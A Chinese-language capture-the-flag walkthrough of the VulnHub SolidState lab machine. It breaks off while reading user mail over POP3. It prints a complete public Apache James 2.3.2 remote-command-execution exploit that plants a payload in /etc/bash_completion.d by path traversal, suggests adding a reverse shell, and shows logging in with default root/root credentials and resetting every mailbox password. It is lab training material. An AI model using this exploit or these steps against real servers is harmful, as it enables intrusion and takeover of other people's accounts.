# SolidState
下载地址：https://download.vulnhub.com/solidstate/SolidState.zip
## 实战演练
找到靶场IP地址：`192.168.32.156`
![image-20220612194228691](../../.gitbook/assets/image-20220612194228691.png)
扫描对外端口
```
┌──(root💀kali)-[/tmp]
└─# nmap  -sT -sV  -p1-65535 192.168.32.156                                                                    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-12 07:41 EDT
Nmap scan report for 192.168.32.156
Host is up (0.00013s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
25/tcp   open  smtp        JAMES smtpd 2.3.2
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
MAC Address: 00:0C:29:FA:6B:D9 (VMware)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds
```
浏览器访问80端口
![image-20220612194414845](../../.gitbook/assets/image-20220612194414845.png)
扫描80端口的目录没有发现什么可用信息。
![image-20220617142619876](../../.gitbook/assets/image-20220617142619876.png)
搜索James服务可利用脚本
```
┌──(root💀kali)-[~/Desktop]
└─# searchsploit james
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Apache James Server 2.2 - SMTP Denial of Service                                   | multiple/dos/27915.pl
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploi | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                               | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)     | linux/remote/50347.py
WheresJames Webcam Publisher Beta 2.0.0014 - Remote Buffer Overflow                | windows/remote/944.c
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
查看利用脚本
```
┌──(root💀kali)-[~/Desktop]
└─# searchsploit -m 35513
  Exploit: Apache James Server 2.3.2 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/35513
     Path: /usr/share/exploitdb/exploits/linux/remote/35513.py
File Type: Python script, ASCII text executable
Copied to: /root/Desktop/35513.py
┌──(root💀kali)-[~/Desktop]
└─# cat 35513.py              
#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d
import socket
import sys
import time
# specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user
payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'
if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s \n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)
ip = sys.argv[1]
def recv(s):
        s.recv(1024)
        time.sleep(0.2)
try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()
    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo PI:EMAIL\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: \r\n")
    recv(s)
    # also try s.send("rcpt to: \r\n") if the recipient cannot be found
    s.send("rcpt to: \r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: PI:EMAIL\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
except:
    print "Connection failed."                                                                          
```
> 漏洞存在于_adduser_功能中。添加新用户时，服务器会创建一个新的子目录来存储该用户的传入和传出电子邮件。但是，用户名字段未正确验证。因此，当我们使用用户名"`../../../../../../../../etc/bash_completion.d`"创建用户时，任何发送到该用户将存储在该目录路径中。为什么这么危险？长话短说，目录 /etc/bash\_completion.d 下的任何内容都由 Bash 自动为所有用户加载！
>
> 因此，如果我们使用指向 `/etc/bash_completion.d` 目录的用户名**创建用户**，当我们向该用户发送电子邮件时，我们的电子邮件将保存在 `bash_completion.d` 目录中，并且我们的电子邮件内容会自动加载当任何用户登录机器时使用 Bash。因此，**如果我们在电子邮件中包含反向 shell，我们所要做的就是等待单个用户登录并且我们可以访问机器！**
nc连接james的**4555**管理端口，使用默认密码root/root进行登录
```
┌──(root💀kali)-[~/Desktop]
└─# nc 192.168.32.156   4555                                                                                   
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
Unknown command 
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```
可以列出用户以查看五个帐户：
```
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```
可以更改每个用户的密码为`123456`。
```
setpassword -h
Usage: setpassword [username] [password]
setpassword james 123456  
Password for james reset
setpassword thomas 123456
Password for thomas reset
setpassword john 123456
Password for john reset
setpassword mindy 123456
Password for mindy reset
setpassword mailadmin 123456
Password for mailadmin reset
```
对于每个帐户，我现在可以连接到 TCP 110 (POP3) 来检查邮件。`telnet`最适合连接到 POP3。
第一个用户 james 没有消息：
```
┌──(root💀kali)-[~/Desktop]
└─# telnet 192.168.32.156 110
Trying 192.168.32.156...
Connected to 192.168.32.156.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user james
+OK
pass 123456
+OK Welcome james
list
+OK 0 0
.
```
> `ctrl`+`]`键退出
thomas 中也没有邮件
```
┌──(root💀kali)-[~/Desktop]
└─# telnet 192.168.32.156 110
Trying 192.168.32.156...
Connected to 192.168.32.156.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user thomas
+OK
pass 123456
+OK Welcome thomas
list
+OK 0 0
.
```
但 john 确实显示了一条消息：
```
┌──(root💀kali)-[~/Desktop]
└─# telnet 192.168.32.156 110
Trying 192.168.32.156...